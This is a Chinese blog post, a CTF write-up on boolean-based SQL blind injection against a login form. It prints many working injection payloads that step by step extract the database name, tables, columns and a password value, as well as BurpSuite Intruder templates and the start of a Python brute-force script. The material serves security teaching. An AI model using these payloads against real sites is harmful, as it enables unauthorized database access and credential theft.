<!DOCTYPE html><html><head><meta name=generator content="Hexo 3.9.0"><meta charset=utf-8><title>SQL盲注的简单分析 | qwzf</title><meta name=viewport content="width=device-width, initial-scale=1, maximum-scale=1"><meta name=keywords content="qwzf,Qwzf's Blog"><meta name=description content="首发于先知社区 前言最近做了些基于布尔盲注和基于时间盲注的CTF题，掌握了CTF题中SQL盲注的三种解法，收获很大，于是结合题目分享一下。 BASE-Blind-Inject题目信息###题干分析第一次走进误区，刚看到这道题的时候看到了登录框，第一印象应该就是简单的闭合注入，测试后发现是双引号闭合，所以构造payload注入 &quot; or 1=1# 果然注入进去了。虽然没有出现flag，但给予了提示"><meta name=keywords content=BUG,SQL盲注><meta property=og:type content=article><meta property=og:title content=SQL盲注的简单分析><meta property=og:url content=https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/index.html><meta property=og:site_name content=qwzf><meta property=og:description content="首发于先知社区 前言最近做了些基于布尔盲注和基于时间盲注的CTF题，掌握了CTF题中SQL盲注的三种解法，收获很大，于是结合题目分享一下。 BASE-Blind-Inject题目信息###题干分析第一次走进误区，刚看到这道题的时候看到了登录框，第一印象应该就是简单的闭合注入，测试后发现是双引号闭合，所以构造payload注入 &quot; or 1=1# 果然注入进去了。虽然没有出现flag，但给予了提示"><meta property=og:locale content=zh-CN><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190727173029-2c674382-b051-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190727174046-9c3c76f4-b052-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190727174812-a61b52b6-b053-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812192807-41aa4690-bcf4-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812192942-7a47141a-bcf4-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812201425-b995d5ec-bcfa-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812200742-c97f3f12-bcf9-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812200947-14478324-bcfa-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812201657-14305b58-bcfb-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812202004-83ea8aea-bcfb-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812202024-8fdd4130-bcfb-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812202525-4319f2b6-bcfc-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812204433-ef16fb0c-bcfe-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812205426-50fcf0e6-bd00-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812205859-f3505266-bd00-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812210349-a06d0b24-bd01-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812210555-eb6d076e-bd01-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812212116-1065434a-bd04-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812212230-3c86e8c0-bd04-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812213814-6f103a06-bd06-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812213957-ac97aa9e-bd06-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812215052-32bd5cbc-bd08-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812215333-92c4cbd6-bd08-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812222006-4862ce68-bd0c-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812235329-5405abb6-bd19-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812235611-b4895e4c-bd19-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812235635-c2dfaf28-bd19-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190813004830-03a339f6-bd21-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190813004911-1c5cf446-bd21-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190813005009-3ec5b3e2-bd21-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190813005024-4791b584-bd21-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190813005056-5ad34cf2-bd21-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190813005114-652b37be-bd21-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190812204433-ef16fb0c-bcfe-1.jpg><meta property=og:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190813193259-1a4f83e2-bdbe-1.jpg><meta property=og:updated_time content=2020-03-28T17:11:45.441Z><meta name=twitter:card content=summary><meta name=twitter:title content=SQL盲注的简单分析><meta name=twitter:description content="首发于先知社区 前言最近做了些基于布尔盲注和基于时间盲注的CTF题，掌握了CTF题中SQL盲注的三种解法，收获很大，于是结合题目分享一下。 BASE-Blind-Inject题目信息###题干分析第一次走进误区，刚看到这道题的时候看到了登录框，第一印象应该就是简单的闭合注入，测试后发现是双引号闭合，所以构造payload注入 &quot; or 1=1# 果然注入进去了。虽然没有出现flag，但给予了提示"><meta name=twitter:image content=http://xzfile.aliyuncs.com/media/upload/picture/20190727173029-2c674382-b051-1.jpg><link rel=icon href=/favicon.ico><link href=//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/css/style.css><script src=/js/pace.min.js></script></head></html><script src=https://g.joyinshare.com/hc/ribbon.min.js type=text/javascript></script><canvas class=fireworks style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas><script type=text/javascript src=//cdn.bootcss.com/animejs/2.2.0/anime.min.js></script><script type=text/javascript src=/js/clicklove.js></script><body><div id=container><header id=header><div id=banner></div><div id=header-outer><div id=header-menu class="header-menu-pos animated"><div class=header-menu-container><a href="/" class=left><span class=site-title>Qwzf&#39;s Blog</span></a><nav id=header-menu-nav class=right><a href="/"><i class="fa fa-home"></i> <span>Home</span></a> <a target=_blank href=/archives><i class="fa fa-archive"></i> <span>Archives</span></a> <a href=/about><i class="fa fa-user"></i> <span>About</span></a></nav><a class=mobile-header-menu-button><i class="fa fa-bars"></i></a></div></div><div id=header-row><div id=logo><a href="/"><img src=/images/logo.png alt=logo></a></div><div class=header-info><div id=header-title><h2>Qwzf&#39;s Blog</h2></div><div id=header-description><h3>一个爱学习的小白</h3></div></div><nav class=header-nav><div class=social><a title=qwzf target=_blank href=//qwzf.github.io><i class="fa fa-home fa-2x"></i></a> <a title=Github target=_blank href="//github.com/"><i class="fa fa-github fa-2x"></i></a> <a title=Weibo target=_blank href="//weibo.com/"><i class="fa fa-weibo fa-2x"></i></a> <a title=Twitter target=_blank href="//twitter.com/"><i class="fa fa-twitter fa-2x"></i></a></div></nav></div></div></header><div class=outer><section id=main class=body-wrap><article id=post-SQL盲注的简单分析 class="article article-type-post" itemscope itemprop=blogPost><div class=article-inner><header class=article-header><h1 class=post-title itemprop=name>SQL盲注的简单分析</h1><div class=post-title-bar><ul><li><i class="fa fa-book"></i> <span class=post-meta-item-text>分类:</span> <span class=post-count><a href="/categories/Web/">Web</a></span></li><li><i class="fa fa-calendar"></i> <span class=post-meta-item-text>日期:</span> <span class=post-count>2019-10-26</span></li><li><i class="fa fa-eye"></i> <span class=post-meta-item-text>阅读量:</span> <span id=busuanzi_value_page_pv>次</span></li><li><span class=post-time><span class=post-meta-item-icon><i class="fa fa-keyboard-o"></i> <span class=post-meta-item-text>字数统计:</span> <span class=post-count>5.7k字</span></span></span></li><li><span class=post-time><span class=post-meta-item-icon><i class="fa fa-hourglass-half"></i> <span class=post-meta-item-text>阅读时长:</span> <span class=post-count>26分</span></span></span></li></ul></div></header><div class="article-entry post-content" itemprop=articleBody><p><strong>首发于先知社区</strong></p><h2 id=前言><a href=#前言 class=headerlink title=前言></a>前言</h2><p>最近做了些基于布尔盲注和基于时间盲注的CTF题，掌握了CTF题中SQL盲注的三种解法，收获很大，于是结合题目分享一下。</p><h2 id=BASE-Blind-Inject><a href=#BASE-Blind-Inject class=headerlink title=BASE-Blind-Inject></a>BASE-Blind-Inject</h2><h3 id=题目信息><a href=#题目信息 class=headerlink title=题目信息></a>题目信息</h3><p><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190727173029-2c674382-b051-1.jpg><br>###题干分析<br>第一次走进误区，刚看到这道题的时候<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190727174046-9c3c76f4-b052-1.jpg><br>看到了登录框，第一印象应该就是简单的闭合注入，测试后发现是双引号闭合，所以构造payload注入</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or 1=1<span class=comment>#</span></span><br></pre></td></tr></table></figure><p><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190727174812-a61b52b6-b053-1.jpg><br>果然注入进去了。虽然没有出现flag，但给予了提示“flag就在数据库里面”，然后又想到题目标题，翻译成“简单盲注”<br>并且flag在数据库？有页面返回？所以应该想到这是SQL注入的一种注入方式叫做布尔盲注,并且是POST型。<br>###知识了解<br><strong>布尔盲注</strong></p><ol><li>布尔盲注利用前提<br>页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。</li><li>布尔盲注利用</li></ol><ul><li><p>该语句判断数据库个数，当数据库个数大于n页面显示正常</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>(<span class=keyword>select</span> <span class=keyword>count</span>(schema_name) <span class=keyword>from</span> information_schema.schemata)&gt; n</span><br></pre></td></tr></table></figure></li><li><p>该语句判断数据库内第一个数据库名有多少字符，字符个数大于n页面显示正常</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>(<span class=keyword>select</span> <span class=keyword>length</span>(schema_name) <span class=keyword>from</span> information_schema.schemata <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>)&gt; n</span><br></pre></td></tr></table></figure></li><li><p>该语句判断第一个库第一个字符是什么，ascii值大于n页面显示正常</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>(<span class=keyword>select</span> <span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> schema_name <span class=keyword>from</span> information_schema.schemata <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>)))&gt;n</span><br></pre></td></tr></table></figure></li></ul><p><strong>相关函数</strong></p><ul><li>Length()函数 返回字符串的长度</li><li>substr()截取字符串，偏移是从1开始，而不是0开始</li><li>ascii()返回字符的ascii码</li><li>count(column_name)函数返回指定列的值的数目(NULL 不计入)</li></ul><p>###开始测试</p><ol><li>测闭合方式<br>输入’ or 1=1#不回显<br>输入” or 1=1#正常<br>可判定是双引号闭合。</li><li>测长度<br>判断数据库名的长度<br>输入” or (length(database())=10)–+正常<br>说明长度为8。</li><li>测字符<br>用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码<br>输入” or (ascii(substr(database(),1,1))&gt;97)–+正常</li></ol><p>###盲注开始<br>####费心劳神-手工盲注<br>利用二分法进行手工盲注。手工盲注可以使用BurpSuite，构造payload在Repeater点击Go进行发包，这样会比较便捷。<br>1.猜库<br>用到获取当前数据库函数<figure class="highlight plain"><table><tr><td class=code><pre><span class=line></span><br><span class=line>- 猜库长</span><br><span class=line>```sql</span><br><span class=line>&quot; or (length(database())=10)--+正常</span><br></pre></td></tr></table></figure></p><p><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812192807-41aa4690-bcf4-1.jpg><br>所以数据库长度为10</p><ul><li>猜库名<br>第一个字符<figure class=highlight><table><tr><td class=code><pre><span class=line>" or (ascii(substr(database(),1,1))&gt;32)--+正常</span><br><span class=line>" or (ascii(substr(database(),1,1))&gt;128)--+不回显</span><br><span class=line>" or (ascii(substr(database(),1,1))&gt;80)--+正常</span><br><span class=line>" or (ascii(substr(database(),1,1))&gt;104)--+不回显</span><br><span class=line>" or (ascii(substr(database(),1,1))&gt;92)--+正常</span><br><span class=line>" or (ascii(substr(database(),1,1))&gt;98)--+正常</span><br><span class=line>" or (ascii(substr(database(),1,1))&gt;101)--+不回显</span><br><span class=line>" or (ascii(substr(database(),1,1))&gt;100)--+不回显</span><br><span class=line>" or (ascii(substr(database(),1,1))&gt;99)--+不回显</span><br></pre></td></tr></table></figure></li></ul><p><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812192942-7a47141a-bcf4-1.jpg><br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812201425-b995d5ec-bcfa-1.jpg><br>说明数据库名的第一个字符ASCII码为99，即“c”。<br>第二个字符</p><figure class=highlight><table><tr><td class=code><pre><span class=line>" or (ascii(substr(database(),2,1))&gt;32)--+正常</span><br><span class=line>" or (ascii(substr(database(),2,1))&gt;128)--+不回显</span><br><span class=line>" or (ascii(substr(database(),2,1))&gt;80)--+正常</span><br><span class=line>" or (ascii(substr(database(),2,1))&gt;104)--+不回显</span><br><span class=line>" or (ascii(substr(database(),2,1))&gt;92)--+正常</span><br><span class=line>" or (ascii(substr(database(),2,1))&gt;98)--+正常</span><br><span class=line>" or (ascii(substr(database(),2,1))&gt;101)--+正常</span><br><span class=line>" or (ascii(substr(database(),2,1))&gt;102)--+正常</span><br><span class=line>" or (ascii(substr(database(),2,1))&gt;103)--+正常</span><br></pre></td></tr></table></figure><p>说明数据库名的第二个字符ASCII码为104，即“h”。<br>依次猜解，最终得到数据库名：<figure class="highlight plain"><table><tr><td class=code><pre><span class=line></span><br><span class=line>2.猜表</span><br><span class=line></span><br><span class=line>- 猜表长</span><br><span class=line>```sql</span><br><span class=line>&quot; or (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6)--+正常</span><br></pre></td></tr></table></figure></p><p>所以数据表长度为6</p><ul><li>猜表名<br>第一个字符<figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (ascii(substr((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>32</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;128)--+不回显</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>80</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;104)--+正常</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>116</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;122)--+不回显</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>119</span>)<span class=comment>--+不回显</span></span><br><span class=line><span class=string>" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119)--+不回显</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>118</span>)<span class=comment>--+不回显</span></span><br><span class=line><span class=string>" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117)--+不回显</span></span><br></pre></td></tr></table></figure></li></ul><p>说明数据表名的第一个字符ASCII码为117，即“u”。<br>依次猜解，最终得到数据表名：<figure class="highlight plain"><table><tr><td class=code><pre><span class=line></span><br><span class=line>3.猜字段</span><br><span class=line></span><br><span class=line>- 猜字段长</span><br><span class=line>```sql</span><br><span class=line>&quot; or (length((select column_name from information_schema.columns where table_name=&apos;user_2&apos; and table_schema=database() limit 0,1))=2)--+正常</span><br></pre></td></tr></table></figure></p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (length((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_2'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>))=<span class=number>8</span>)<span class=comment>--+正常</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (length((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_2'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>2</span>,<span class=number>1</span>))=<span class=number>8</span>)<span class=comment>--+正常</span></span><br></pre></td></tr></table></figure><p>所以user_2表的数据字段长度分别为2、8、8</p><ul><li>猜字段名<br>第一个字段<figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (ascii(substr((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_2'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>32</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 0,1),1,1))&gt;128)--+不回显</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_2'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>80</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 0,1),1,1))&gt;104)--+正常</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_2'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>116</span>)<span class=comment>--+不回显</span></span><br><span class=line><span class=string>" or (ascii(substr((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 0,1),1,1))&gt;110)--+不回显</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_2'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>107</span>)<span class=comment>--+不回显</span></span><br><span class=line><span class=string>" or (ascii(substr((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 0,1),1,1))&gt;106)--+不回显</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_2'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>105</span>)<span class=comment>--+不回显</span></span><br></pre></td></tr></table></figure></li></ul><p>所以user_2表的第一个字段的字段名的第一个字符ASCII码为105，即“i”。<br>猜第二个字段把limit 0,1改为limit 1,1<br>猜第三个字段把limit 0,1改为limit 2,1<br>依次猜解,最终得到user_2表的3个字段名分别为：<figure class="highlight plain"><figcaption><span>```username``` ```password```</span></figcaption><table><tr><td class=code><pre><span class=line></span><br><span class=line>3.猜数据</span><br><span class=line></span><br><span class=line>- 猜数据长</span><br><span class=line>```sql</span><br><span class=line>&quot; or (length((select password from challenges.user_2 limit 1,1))=32)--+正常</span><br></pre></td></tr></table></figure></p><p>所以user_2表的password字段的第2条数据的数据长度为32，这个应该就是flag那条数据了</p><ul><li>猜数据值<figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (ascii(substr((<span class=keyword>select</span> <span class=keyword>password</span> <span class=keyword>from</span> challenges.user_2 <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>32</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;128)--+不回显</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> <span class=keyword>password</span> <span class=keyword>from</span> challenges.user_2 <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>80</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;104)--+不回显</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> <span class=keyword>password</span> <span class=keyword>from</span> challenges.user_2 <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>92</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;98)--+正常</span></span><br><span class=line><span class=string>"</span> <span class=keyword>or</span> (<span class=keyword>ascii</span>(<span class=keyword>substr</span>((<span class=keyword>select</span> <span class=keyword>password</span> <span class=keyword>from</span> challenges.user_2 <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>),<span class=number>1</span>,<span class=number>1</span>))&gt;<span class=number>101</span>)<span class=comment>--+正常</span></span><br><span class=line><span class=string>" or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;102)--+不回显</span></span><br></pre></td></tr></table></figure></li></ul><p>说明user_2表的password字段的第2条数据(limit 1,1意思是从1开始取(即第二条数据)，取一条数据。)的数据值的第一个字符ASCII码为102，即“f”。<br>依次猜解,最终得到flag</p><p>####简便之法-BurpSuite半自动化盲注<br>一步一步的利用二分法进行手工盲注，是不是有点麻烦了呢？能不能让BurpSuite自己进行按顺序进行一个一个猜解呢？<br>于是用到了BurpSuite的一个功能模块Intruder，构造payload设置变量进行爆破，然后根据返回长度进行排序整理。<br>1、爆库<br>payload</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (ascii(substr(database(),§1§,1))=§32§)<span class=comment>--+</span></span><br></pre></td></tr></table></figure><ol><li><p>先随便输入用户名和密码，然后BurpSuite抓包，发送到Intruder<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812200742-c97f3f12-bcf9-1.jpg></p></li><li><p>设置Positions<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812200947-14478324-bcfa-1.jpg><br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812201657-14305b58-bcfb-1.jpg></p></li><li><p>设置两个变量的爆破类型<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812202004-83ea8aea-bcfb-1.jpg><br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812202024-8fdd4130-bcfb-1.jpg></p></li><li><p>开始爆破，根据返回长度确定爆破结果<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812202525-4319f2b6-bcfc-1.jpg></p></li><li><p>排序、转换字符<br>payload2那一列即是数据库名每个字符的ASCII码，按照payload1进行排序，再转换成字符，得到数据库名<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812204433-ef16fb0c-bcfe-1.jpg></p></li></ol><p>2、爆表<br>payload</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (ascii(substr((<span class=keyword>select</span> table_name <span class=keyword>from</span> information_schema.tables <span class=keyword>where</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>0</span>,<span class=number>1</span>),§<span class=number>1</span>§,<span class=number>1</span>))=§<span class=number>32</span>§)<span class=comment>--+</span></span><br></pre></td></tr></table></figure><ol><li><p>与爆库的不同之处就是payload和结果长度，改一下<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812205426-50fcf0e6-bd00-1.jpg><br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812205859-f3505266-bd00-1.jpg></p></li><li><p>开始爆破，根据返回长度确定爆破结果<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812210349-a06d0b24-bd01-1.jpg></p></li><li><p>排序、转换字符<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812210555-eb6d076e-bd01-1.jpg></p></li></ol><p>3、爆字段<br>payload</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (ascii(substr((<span class=keyword>select</span> column_name <span class=keyword>from</span> information_schema.columns <span class=keyword>where</span> table_name=<span class=string>'user_2'</span> <span class=keyword>and</span> table_schema=<span class=keyword>database</span>() <span class=keyword>limit</span> <span class=number>2</span>,<span class=number>1</span>),§<span class=number>1</span>§,<span class=number>1</span>))=§<span class=number>32</span>§)<span class=comment>--+</span></span><br></pre></td></tr></table></figure><ol><li><p>与爆库的不同之处就是payload和结果长度，改一下(结果长度改为8)</p></li><li><p>开始爆破，根据返回长度确定爆破结果<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812212116-1065434a-bd04-1.jpg></p></li><li><p>排序、转换字符<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812212230-3c86e8c0-bd04-1.jpg></p></li></ol><p>3、爆数据<br>payload</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (ascii(substr((<span class=keyword>select</span> <span class=keyword>password</span> <span class=keyword>from</span> challenges.user_2 <span class=keyword>limit</span> <span class=number>1</span>,<span class=number>1</span>),§<span class=number>1</span>§,<span class=number>1</span>))=§<span class=number>32</span>§)<span class=comment>--+</span></span><br></pre></td></tr></table></figure><ol><li><p>与爆库的不同之处就是payload和结果长度，改一下(结果长度改为32)</p></li><li><p>开始爆破，根据返回长度确定爆破结果<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812213814-6f103a06-bd06-1.jpg></p></li><li><p>排序、转换字符<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812213957-ac97aa9e-bd06-1.jpg></p></li></ol><p><strong>提高效率</strong><br>为了省去转换字符并减少爆破时间，可以选择不使用ascii()函数，第二个变量的爆破类型改成Simple list<br>如：爆库<br>payload</p><figure class="highlight sql"><table><tr><td class=code><pre><span class=line>" or (substr(database(),§1§,1)='§a§')<span class=comment>--+</span></span><br></pre></td></tr></table></figure><p><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812215052-32bd5cbc-bd08-1.jpg><br>爆破结果：<br><img src=http://xzfile.aliyuncs.com/media/upload/picture/20190812215333-92c4cbd6-bd08-1.jpg><br>发现没有区分大小写，所以再通过每个字符的ascii码是否大于等于97判断每个字符是大写还是小写，小于97即大写。<br>这样就提高了一点效率。<br>####神来之笔-脚本盲注<br>使用BurpSuite半自动化盲注，看似可以。但是不是有一种方法，可以不用其他操作，轻松得到数据库的信息呢？于是想到使用脚本进行盲注来提高效率。布尔盲注脚本如下：</p><figure class="highlight python"><table><tr><td class=code><pre><span class=line><span class=keyword>import</span> requests</span><br><span class=line></span><br><span class=line>chars=<span class=string>'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;&#123;&#125;&amp;=+'</span></span><br><span 